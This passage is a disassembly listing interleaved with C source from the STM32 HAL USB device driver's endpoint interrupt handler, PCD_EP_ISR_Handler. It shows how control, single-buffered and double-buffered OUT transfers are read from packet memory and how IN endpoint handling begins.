 800286a:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 800286e:	2b00      	cmp	r3, #0
 8002870:	f280 8302 	bge.w	8002e78 <PCD_EP_ISR_Handler+0x76e>
        {
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002874:	687b      	ldr	r3, [r7, #4]
 8002876:	681b      	ldr	r3, [r3, #0]
 8002878:	881b      	ldrh	r3, [r3, #0]
 800287a:	b29a      	uxth	r2, r3
 800287c:	f640 738f 	movw	r3, #3983	; 0xf8f
 8002880:	4013      	ands	r3, r2
 8002882:	83fb      	strh	r3, [r7, #30]
 8002884:	687b      	ldr	r3, [r7, #4]
 8002886:	681b      	ldr	r3, [r3, #0]
 8002888:	8bfa      	ldrh	r2, [r7, #30]
 800288a:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 800288e:	b292      	uxth	r2, r2
 8002890:	801a      	strh	r2, [r3, #0]

          /* Get Control Data OUT Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 8002892:	687b      	ldr	r3, [r7, #4]
 8002894:	681b      	ldr	r3, [r3, #0]
 8002896:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800289a:	b29b      	uxth	r3, r3
 800289c:	461a      	mov	r2, r3
 800289e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028a0:	781b      	ldrb	r3, [r3, #0]
 80028a2:	00db      	lsls	r3, r3, #3
 80028a4:	4413      	add	r3, r2
 80028a6:	687a      	ldr	r2, [r7, #4]
 80028a8:	6812      	ldr	r2, [r2, #0]
 80028aa:	4413      	add	r3, r2
 80028ac:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80028b0:	881b      	ldrh	r3, [r3, #0]
 80028b2:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80028b6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028b8:	61da      	str	r2, [r3, #28]

          if ((ep->xfer_count != 0U) && (ep->xfer_buff != 0U))
 80028ba:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028bc:	69db      	ldr	r3, [r3, #28]
 80028be:	2b00      	cmp	r3, #0
 80028c0:	d019      	beq.n	80028f6 <PCD_EP_ISR_Handler+0x1ec>
 80028c2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028c4:	695b      	ldr	r3, [r3, #20]
 80028c6:	2b00      	cmp	r3, #0
 80028c8:	d015      	beq.n	80028f6 <PCD_EP_ISR_Handler+0x1ec>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 80028ca:	687b      	ldr	r3, [r7, #4]
 80028cc:	6818      	ldr	r0, [r3, #0]
 80028ce:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028d0:	6959      	ldr	r1, [r3, #20]
 80028d2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028d4:	88da      	ldrh	r2, [r3, #6]
                        ep->pmaadress, (uint16_t)ep->xfer_count);
 80028d6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028d8:	69db      	ldr	r3, [r3, #28]
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 80028da:	b29b      	uxth	r3, r3
 80028dc:	f005 fed5 	bl	800868a <USB_ReadPMA>

            ep->xfer_buff += ep->xfer_count;
 80028e0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028e2:	695a      	ldr	r2, [r3, #20]
 80028e4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028e6:	69db      	ldr	r3, [r3, #28]
 80028e8:	441a      	add	r2, r3
 80028ea:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028ec:	615a      	str	r2, [r3, #20]

            /* Process Control Data OUT Packet */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
            hpcd->DataOutStageCallback(hpcd, 0U);
#else
            HAL_PCD_DataOutStageCallback(hpcd, 0U);
 80028ee:	2100      	movs	r1, #0
 80028f0:	6878      	ldr	r0, [r7, #4]
 80028f2:	f00a f8cf 	bl	800ca94 <HAL_PCD_DataOutStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
          }

          wEPVal = (uint16_t)PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 80028f6:	687b      	ldr	r3, [r7, #4]
 80028f8:	681b      	ldr	r3, [r3, #0]
 80028fa:	881b      	ldrh	r3, [r3, #0]
 80028fc:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

          if (((wEPVal & USB_EP_SETUP) == 0U) && ((wEPVal & USB_EP_RX_STRX) != USB_EP_RX_VALID))
 8002900:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002904:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8002908:	2b00      	cmp	r3, #0
 800290a:	f040 82b5 	bne.w	8002e78 <PCD_EP_ISR_Handler+0x76e>
 800290e:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002912:	f403 5340 	and.w	r3, r3, #12288	; 0x3000
 8002916:	f5b3 5f40 	cmp.w	r3, #12288	; 0x3000
 800291a:	f000 82ad 	beq.w	8002e78 <PCD_EP_ISR_Handler+0x76e>
          {
            PCD_SET_EP_RX_CNT(hpcd->Instance, PCD_ENDP0, ep->maxpacket);
 800291e:	687b      	ldr	r3, [r7, #4]
 8002920:	681b      	ldr	r3, [r3, #0]
 8002922:	61bb      	str	r3, [r7, #24]
 8002924:	687b      	ldr	r3, [r7, #4]
 8002926:	681b      	ldr	r3, [r3, #0]
 8002928:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800292c:	b29b      	uxth	r3, r3
 800292e:	461a      	mov	r2, r3
 8002930:	69bb      	ldr	r3, [r7, #24]
 8002932:	4413      	add	r3, r2
 8002934:	61bb      	str	r3, [r7, #24]
 8002936:	69bb      	ldr	r3, [r7, #24]
 8002938:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800293c:	617b      	str	r3, [r7, #20]
 800293e:	697b      	ldr	r3, [r7, #20]
 8002940:	881b      	ldrh	r3, [r3, #0]
 8002942:	b29b      	uxth	r3, r3
 8002944:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002948:	b29a      	uxth	r2, r3
 800294a:	697b      	ldr	r3, [r7, #20]
 800294c:	801a      	strh	r2, [r3, #0]
 800294e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002950:	691b      	ldr	r3, [r3, #16]
 8002952:	2b3e      	cmp	r3, #62	; 0x3e
 8002954:	d91d      	bls.n	8002992 <PCD_EP_ISR_Handler+0x288>
 8002956:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002958:	691b      	ldr	r3, [r3, #16]
 800295a:	095b      	lsrs	r3, r3, #5
 800295c:	647b      	str	r3, [r7, #68]	; 0x44
 800295e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002960:	691b      	ldr	r3, [r3, #16]
 8002962:	f003 031f 	and.w	r3, r3, #31
 8002966:	2b00      	cmp	r3, #0
 8002968:	d102      	bne.n	8002970 <PCD_EP_ISR_Handler+0x266>
 800296a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800296c:	3b01      	subs	r3, #1
 800296e:	647b      	str	r3, [r7, #68]	; 0x44
 8002970:	697b      	ldr	r3, [r7, #20]
 8002972:	881b      	ldrh	r3, [r3, #0]
 8002974:	b29a      	uxth	r2, r3
 8002976:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002978:	b29b      	uxth	r3, r3
 800297a:	029b      	lsls	r3, r3, #10
 800297c:	b29b      	uxth	r3, r3
 800297e:	4313      	orrs	r3, r2
 8002980:	b29b      	uxth	r3, r3
 8002982:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002986:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800298a:	b29a      	uxth	r2, r3
 800298c:	697b      	ldr	r3, [r7, #20]
 800298e:	801a      	strh	r2, [r3, #0]
 8002990:	e026      	b.n	80029e0 <PCD_EP_ISR_Handler+0x2d6>
 8002992:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002994:	691b      	ldr	r3, [r3, #16]
 8002996:	2b00      	cmp	r3, #0
 8002998:	d10a      	bne.n	80029b0 <PCD_EP_ISR_Handler+0x2a6>
 800299a:	697b      	ldr	r3, [r7, #20]
 800299c:	881b      	ldrh	r3, [r3, #0]
 800299e:	b29b      	uxth	r3, r3
 80029a0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80029a4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80029a8:	b29a      	uxth	r2, r3
 80029aa:	697b      	ldr	r3, [r7, #20]
 80029ac:	801a      	strh	r2, [r3, #0]
 80029ae:	e017      	b.n	80029e0 <PCD_EP_ISR_Handler+0x2d6>
 80029b0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029b2:	691b      	ldr	r3, [r3, #16]
 80029b4:	085b      	lsrs	r3, r3, #1
 80029b6:	647b      	str	r3, [r7, #68]	; 0x44
 80029b8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029ba:	691b      	ldr	r3, [r3, #16]
 80029bc:	f003 0301 	and.w	r3, r3, #1
 80029c0:	2b00      	cmp	r3, #0
 80029c2:	d002      	beq.n	80029ca <PCD_EP_ISR_Handler+0x2c0>
 80029c4:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80029c6:	3301      	adds	r3, #1
 80029c8:	647b      	str	r3, [r7, #68]	; 0x44
 80029ca:	697b      	ldr	r3, [r7, #20]
 80029cc:	881b      	ldrh	r3, [r3, #0]
 80029ce:	b29a      	uxth	r2, r3
 80029d0:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80029d2:	b29b      	uxth	r3, r3
 80029d4:	029b      	lsls	r3, r3, #10
 80029d6:	b29b      	uxth	r3, r3
 80029d8:	4313      	orrs	r3, r2
 80029da:	b29a      	uxth	r2, r3
 80029dc:	697b      	ldr	r3, [r7, #20]
 80029de:	801a      	strh	r2, [r3, #0]
            PCD_SET_EP_RX_STATUS(hpcd->Instance, PCD_ENDP0, USB_EP_RX_VALID);
 80029e0:	687b      	ldr	r3, [r7, #4]
 80029e2:	681b      	ldr	r3, [r3, #0]
 80029e4:	881b      	ldrh	r3, [r3, #0]
 80029e6:	b29b      	uxth	r3, r3
 80029e8:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80029ec:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80029f0:	827b      	strh	r3, [r7, #18]
 80029f2:	8a7b      	ldrh	r3, [r7, #18]
 80029f4:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80029f8:	827b      	strh	r3, [r7, #18]
 80029fa:	8a7b      	ldrh	r3, [r7, #18]
 80029fc:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002a00:	827b      	strh	r3, [r7, #18]
 8002a02:	687b      	ldr	r3, [r7, #4]
 8002a04:	681a      	ldr	r2, [r3, #0]
 8002a06:	8a7b      	ldrh	r3, [r7, #18]
 8002a08:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002a0c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002a10:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002a14:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002a18:	b29b      	uxth	r3, r3
 8002a1a:	8013      	strh	r3, [r2, #0]
 8002a1c:	e22c      	b.n	8002e78 <PCD_EP_ISR_Handler+0x76e>
    }
    else
    {
      /* Decode and service non control endpoints interrupt */
      /* process related endpoint register */
      wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, epindex);
 8002a1e:	687b      	ldr	r3, [r7, #4]
 8002a20:	681b      	ldr	r3, [r3, #0]
 8002a22:	461a      	mov	r2, r3
 8002a24:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a28:	009b      	lsls	r3, r3, #2
 8002a2a:	4413      	add	r3, r2
 8002a2c:	881b      	ldrh	r3, [r3, #0]
 8002a2e:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

      if ((wEPVal & USB_EP_CTR_RX) != 0U)
 8002a32:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 8002a36:	2b00      	cmp	r3, #0
 8002a38:	f280 80f6 	bge.w	8002c28 <PCD_EP_ISR_Handler+0x51e>
      {
        /* clear int flag */
        PCD_CLEAR_RX_EP_CTR(hpcd->Instance, epindex);
 8002a3c:	687b      	ldr	r3, [r7, #4]
 8002a3e:	681b      	ldr	r3, [r3, #0]
 8002a40:	461a      	mov	r2, r3
 8002a42:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a46:	009b      	lsls	r3, r3, #2
 8002a48:	4413      	add	r3, r2
 8002a4a:	881b      	ldrh	r3, [r3, #0]
 8002a4c:	b29a      	uxth	r2, r3
 8002a4e:	f640 738f 	movw	r3, #3983	; 0xf8f
 8002a52:	4013      	ands	r3, r2
 8002a54:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 8002a58:	687b      	ldr	r3, [r7, #4]
 8002a5a:	681b      	ldr	r3, [r3, #0]
 8002a5c:	461a      	mov	r2, r3
 8002a5e:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a62:	009b      	lsls	r3, r3, #2
 8002a64:	4413      	add	r3, r2
 8002a66:	f8b7 2048 	ldrh.w	r2, [r7, #72]	; 0x48
 8002a6a:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 8002a6e:	b292      	uxth	r2, r2
 8002a70:	801a      	strh	r2, [r3, #0]
        ep = &hpcd->OUT_ep[epindex];
 8002a72:	f897 204d 	ldrb.w	r2, [r7, #77]	; 0x4d
 8002a76:	4613      	mov	r3, r2
 8002a78:	009b      	lsls	r3, r3, #2
 8002a7a:	4413      	add	r3, r2
 8002a7c:	00db      	lsls	r3, r3, #3
 8002a7e:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002a82:	687a      	ldr	r2, [r7, #4]
 8002a84:	4413      	add	r3, r2
 8002a86:	657b      	str	r3, [r7, #84]	; 0x54

        /* OUT Single Buffering */
        if (ep->doublebuffer == 0U)
 8002a88:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a8a:	7b1b      	ldrb	r3, [r3, #12]
 8002a8c:	2b00      	cmp	r3, #0
 8002a8e:	d123      	bne.n	8002ad8 <PCD_EP_ISR_Handler+0x3ce>
        {
          count = (uint16_t)PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 8002a90:	687b      	ldr	r3, [r7, #4]
 8002a92:	681b      	ldr	r3, [r3, #0]
 8002a94:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002a98:	b29b      	uxth	r3, r3
 8002a9a:	461a      	mov	r2, r3
 8002a9c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a9e:	781b      	ldrb	r3, [r3, #0]
 8002aa0:	00db      	lsls	r3, r3, #3
 8002aa2:	4413      	add	r3, r2
 8002aa4:	687a      	ldr	r2, [r7, #4]
 8002aa6:	6812      	ldr	r2, [r2, #0]
 8002aa8:	4413      	add	r3, r2
 8002aaa:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002aae:	881b      	ldrh	r3, [r3, #0]
 8002ab0:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002ab4:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

          if (count != 0U)
 8002ab8:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002abc:	2b00      	cmp	r3, #0
 8002abe:	f000 808e 	beq.w	8002bde <PCD_EP_ISR_Handler+0x4d4>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, count);
 8002ac2:	687b      	ldr	r3, [r7, #4]
 8002ac4:	6818      	ldr	r0, [r3, #0]
 8002ac6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ac8:	6959      	ldr	r1, [r3, #20]
 8002aca:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002acc:	88da      	ldrh	r2, [r3, #6]
 8002ace:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002ad2:	f005 fdda 	bl	800868a <USB_ReadPMA>
 8002ad6:	e082      	b.n	8002bde <PCD_EP_ISR_Handler+0x4d4>
        }
#if (USE_USB_DOUBLE_BUFFER == 1U)
        else
        {
          /* manage double buffer bulk out */
          if (ep->type == EP_TYPE_BULK)
 8002ad8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ada:	78db      	ldrb	r3, [r3, #3]
 8002adc:	2b02      	cmp	r3, #2
 8002ade:	d10a      	bne.n	8002af6 <PCD_EP_ISR_Handler+0x3ec>
          {
            count = HAL_PCD_EP_DB_Receive(hpcd, ep, wEPVal);
 8002ae0:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002ae4:	461a      	mov	r2, r3
 8002ae6:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002ae8:	6878      	ldr	r0, [r7, #4]
 8002aea:	f000 f9d3 	bl	8002e94 <HAL_PCD_EP_DB_Receive>
 8002aee:	4603      	mov	r3, r0
 8002af0:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50
 8002af4:	e073      	b.n	8002bde <PCD_EP_ISR_Handler+0x4d4>
          }
          else /* manage double buffer iso out */
          {
            /* free EP OUT Buffer */
            PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002af6:	687b      	ldr	r3, [r7, #4]
 8002af8:	681b      	ldr	r3, [r3, #0]
 8002afa:	461a      	mov	r2, r3
 8002afc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002afe:	781b      	ldrb	r3, [r3, #0]
 8002b00:	009b      	lsls	r3, r3, #2
 8002b02:	4413      	add	r3, r2
 8002b04:	881b      	ldrh	r3, [r3, #0]
 8002b06:	b29b      	uxth	r3, r3
 8002b08:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002b0c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002b10:	f8a7 3052 	strh.w	r3, [r7, #82]	; 0x52
 8002b14:	687b      	ldr	r3, [r7, #4]
 8002b16:	681b      	ldr	r3, [r3, #0]
 8002b18:	461a      	mov	r2, r3
 8002b1a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b1c:	781b      	ldrb	r3, [r3, #0]
 8002b1e:	009b      	lsls	r3, r3, #2
 8002b20:	441a      	add	r2, r3
 8002b22:	f8b7 3052 	ldrh.w	r3, [r7, #82]	; 0x52
 8002b26:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002b2a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002b2e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002b32:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002b36:	b29b      	uxth	r3, r3
 8002b38:	8013      	strh	r3, [r2, #0]

            if ((PCD_GET_ENDPOINT(hpcd->Instance, ep->num) & USB_EP_DTOG_RX) != 0U)
 8002b3a:	687b      	ldr	r3, [r7, #4]
 8002b3c:	681b      	ldr	r3, [r3, #0]
 8002b3e:	461a      	mov	r2, r3
 8002b40:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b42:	781b      	ldrb	r3, [r3, #0]
 8002b44:	009b      	lsls	r3, r3, #2
 8002b46:	4413      	add	r3, r2
 8002b48:	881b      	ldrh	r3, [r3, #0]
 8002b4a:	b29b      	uxth	r3, r3
 8002b4c:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002b50:	2b00      	cmp	r3, #0
 8002b52:	d022      	beq.n	8002b9a <PCD_EP_ISR_Handler+0x490>
            {
              /* read from endpoint BUF0Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002b54:	687b      	ldr	r3, [r7, #4]
 8002b56:	681b      	ldr	r3, [r3, #0]
 8002b58:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b5c:	b29b      	uxth	r3, r3
 8002b5e:	461a      	mov	r2, r3
 8002b60:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b62:	781b      	ldrb	r3, [r3, #0]
 8002b64:	00db      	lsls	r3, r3, #3
 8002b66:	4413      	add	r3, r2
 8002b68:	687a      	ldr	r2, [r7, #4]
 8002b6a:	6812      	ldr	r2, [r2, #0]
 8002b6c:	4413      	add	r3, r2
 8002b6e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002b72:	881b      	ldrh	r3, [r3, #0]
 8002b74:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002b78:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 8002b7c:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002b80:	2b00      	cmp	r3, #0
 8002b82:	d02c      	beq.n	8002bde <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002b84:	687b      	ldr	r3, [r7, #4]
 8002b86:	6818      	ldr	r0, [r3, #0]
 8002b88:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b8a:	6959      	ldr	r1, [r3, #20]
 8002b8c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b8e:	891a      	ldrh	r2, [r3, #8]
 8002b90:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002b94:	f005 fd79 	bl	800868a <USB_ReadPMA>
 8002b98:	e021      	b.n	8002bde <PCD_EP_ISR_Handler+0x4d4>
              }
            }
            else
            {
              /* read from endpoint BUF1Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002b9a:	687b      	ldr	r3, [r7, #4]
 8002b9c:	681b      	ldr	r3, [r3, #0]
 8002b9e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002ba2:	b29b      	uxth	r3, r3
 8002ba4:	461a      	mov	r2, r3
 8002ba6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ba8:	781b      	ldrb	r3, [r3, #0]
 8002baa:	00db      	lsls	r3, r3, #3
 8002bac:	4413      	add	r3, r2
 8002bae:	687a      	ldr	r2, [r7, #4]
 8002bb0:	6812      	ldr	r2, [r2, #0]
 8002bb2:	4413      	add	r3, r2
 8002bb4:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002bb8:	881b      	ldrh	r3, [r3, #0]
 8002bba:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002bbe:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 8002bc2:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002bc6:	2b00      	cmp	r3, #0
 8002bc8:	d009      	beq.n	8002bde <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002bca:	687b      	ldr	r3, [r7, #4]
 8002bcc:	6818      	ldr	r0, [r3, #0]
 8002bce:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bd0:	6959      	ldr	r1, [r3, #20]
 8002bd2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bd4:	895a      	ldrh	r2, [r3, #10]
 8002bd6:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002bda:	f005 fd56 	bl	800868a <USB_ReadPMA>
          }
        }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

        /* multi-packet on the NON control OUT endpoint */
        ep->xfer_count += count;
 8002bde:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002be0:	69da      	ldr	r2, [r3, #28]
 8002be2:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002be6:	441a      	add	r2, r3
 8002be8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bea:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += count;
 8002bec:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bee:	695a      	ldr	r2, [r3, #20]
 8002bf0:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002bf4:	441a      	add	r2, r3
 8002bf6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bf8:	615a      	str	r2, [r3, #20]

        if ((ep->xfer_len == 0U) || (count < ep->maxpacket))
 8002bfa:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bfc:	699b      	ldr	r3, [r3, #24]
 8002bfe:	2b00      	cmp	r3, #0
 8002c00:	d005      	beq.n	8002c0e <PCD_EP_ISR_Handler+0x504>
 8002c02:	f8b7 2050 	ldrh.w	r2, [r7, #80]	; 0x50
 8002c06:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c08:	691b      	ldr	r3, [r3, #16]
 8002c0a:	429a      	cmp	r2, r3
 8002c0c:	d206      	bcs.n	8002c1c <PCD_EP_ISR_Handler+0x512>
        {
          /* RX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataOutStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataOutStageCallback(hpcd, ep->num);
 8002c0e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c10:	781b      	ldrb	r3, [r3, #0]
 8002c12:	4619      	mov	r1, r3
 8002c14:	6878      	ldr	r0, [r7, #4]
 8002c16:	f009 ff3d 	bl	800ca94 <HAL_PCD_DataOutStageCallback>
 8002c1a:	e005      	b.n	8002c28 <PCD_EP_ISR_Handler+0x51e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002c1c:	687b      	ldr	r3, [r7, #4]
 8002c1e:	681b      	ldr	r3, [r3, #0]
 8002c20:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002c22:	4618      	mov	r0, r3
 8002c24:	f003 ffe3 	bl	8006bee <USB_EPStartXfer>
        }
      }

      if ((wEPVal & USB_EP_CTR_TX) != 0U)
 8002c28:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002c2c:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8002c30:	2b00      	cmp	r3, #0
 8002c32:	f000 8121 	beq.w	8002e78 <PCD_EP_ISR_Handler+0x76e>
      {
        ep = &hpcd->IN_ep[epindex];
 8002c36:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002c3a:	1c5a      	adds	r2, r3, #1
 8002c3c:	4613      	mov	r3, r2
 8002c3e:	009b      	lsls	r3, r3, #2
 8002c40:	4413      	add	r3, r2
 8002c42:	00db      	lsls	r3, r3, #3
 8002c44:	687a      	ldr	r2, [r7, #4]
 8002c46:	4413      	add	r3, r2
 8002c48:	657b      	str	r3, [r7, #84]	; 0x54

        /* clear int flag */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, epindex);
 8002c4a:	687b      	ldr	r3, [r7, #4]
 8002c4c:	681b      	ldr	r3, [r3, #0]
 8002c4e:	461a      	mov	r2, r3
 8002c50:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002c54:	009b      	lsls	r3, r3, #2
 8002c56:	4413      	add	r3, r2
 8002c58:	881b      	ldrh	r3, [r3, #0]
 8002c5a:	b29b      	uxth	r3, r3
 8002c5c:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 8002c60:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002c64:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 8002c68:	687b      	ldr	r3, [r7, #4]
 8002c6a:	681b      	ldr	r3, [r3, #0]
 8002c6c:	461a      	mov	r2, r3
 8002c6e:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002c72:	009b      	lsls	r3, r3, #2
 8002c74:	441a      	add	r2, r3
 8002c76:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8002c7a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002c7e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002c82:	b29b      	uxth	r3, r3
 8002c84:	8013      	strh	r3, [r2, #0]

        if (ep->type == EP_TYPE_ISOC)
 8002c86:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c88:	78db      	ldrb	r3, [r3, #3]
 8002c8a:	2b01      	cmp	r3, #1
 8002c8c:	f040 80a2 	bne.w	8002dd4 <PCD_EP_ISR_Handler+0x6ca>
        {
          ep->xfer_len = 0U;
 8002c90:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c92:	2200      	movs	r2, #0
 8002c94:	619a      	str	r2, [r3, #24]

#if (USE_USB_DOUBLE_BUFFER == 1U)
          if (ep->doublebuffer != 0U)
 8002c96:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c98:	7b1b      	ldrb	r3, [r3, #12]
 8002c9a:	2b00      	cmp	r3, #0
 8002c9c:	f000 8093 	beq.w	8002dc6 <PCD_EP_ISR_Handler+0x6bc>
          {
            if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002ca0:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002ca4:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002ca8:	2b00      	cmp	r3, #0
 8002caa:	d046      	beq.n	8002d3a <PCD_EP_ISR_Handler+0x630>
            {
              PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002cac:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cae:	785b      	ldrb	r3, [r3, #1]
